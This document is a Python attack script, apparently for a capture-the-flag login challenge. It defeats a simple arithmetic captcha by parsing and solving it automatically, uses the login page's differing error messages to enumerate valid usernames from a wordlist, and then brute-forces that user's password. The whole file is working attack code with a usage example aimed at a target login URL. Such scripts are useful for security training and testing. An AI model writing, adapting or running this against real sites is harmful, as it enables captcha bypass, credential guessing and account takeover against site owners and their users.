import requests
from termcolor import colored
from bs4 import BeautifulSoup
from re import search, sub, split
from argparse import ArgumentParser

def get_captcha_code(url):
        data = {"username": "sec0gh", "password": "sec0gh"}
        response = requests.post(url, data=data)
        captcha_Str = search(r'\d+\s*[-+*]\s*\d+ = \?', response.text)
        if captcha_Str:
            captcha_Str = captcha_Str.group()
            print(captcha_Str)
            captcha_Str = sub(r' = \?', '', captcha_Str)
            print(captcha_Str)
            numbers = split(r'\s*[-+*]\s*', captcha_Str)

            num1 = int(numbers[0])
            num2 = int(numbers[1])
            if '+' in captcha_Str:
                captcha_code = num1 + num2
                print(captcha_code)
                return captcha_code
            elif '-' in captcha_Str:
                captcha_code = num1 - num2
                print(captcha_code)
                return captcha_code
            elif '*' in captcha_Str:
                captcha_code = num1 * num2
                print(captcha_code)
                return captcha_code
        else:
            print("No captcha found.")


def username_enum(url,usernames_list):
    with open(f'{usernames_list}','r') as file:
        for username in file:
            username = username.strip()
            captcha_code = get_captcha_code(url)
            data = {"username": username, "password": "sec0gh", "captcha": captcha_code}
            response = requests.post(url, data=data)    
            if f"The user &#39;{username}&#39; does not exist" in response.text:
                print(colored("Invalid user.",'red'))
            else:
                print(colored("Valid user is found: "+ username,"green")) 
                return username
                
                
def password_enum(username,url,passwords_list):
    with open(f'{passwords_list}','r') as file:
        for password in file:
            password = password.strip()
            captcha_code = get_captcha_code(url)
            data = {"username": username, "password": password, "captcha": captcha_code}
            response = requests.post(url, data=data) 
            if f"Invalid password for user &#39;{username}&#39;" in response.text:
                print(colored("Invalid password.",'red'))
            else:
                print(colored("Valid password is found: "+ password,"green")) 
                return password
    
def parse_args():
    example = '''
    Example:
    python3 exploit.py -u http://Target_IP/login -ul /path/usernames.txt -pl /path/passwords.txt"
    '''
    parser = ArgumentParser(epilog=example,description='Retrieve the valid credentials using a valid captcha code')
    parser.add_argument('-u', '--url', required=True, help='The target URL')
    parser.add_argument('-ul', '--usernames-list', required=True, type= str, help='Pass the usernames list path')
    parser.add_argument('-pl', '--passwords-list', required=True, help='Pass the passwords list path')
    args = parser.parse_args()
    return args
           
def main():
    args = parse_args() 
    username = username_enum(args.url, args.usernames_list)
    password = password_enum(username, args.url,args.passwords_list)
    
    print("The valid credentials found:")
    print(f"Username: {username}")
    print(f"Password: {password}")


if __name__ == "__main__":
    main()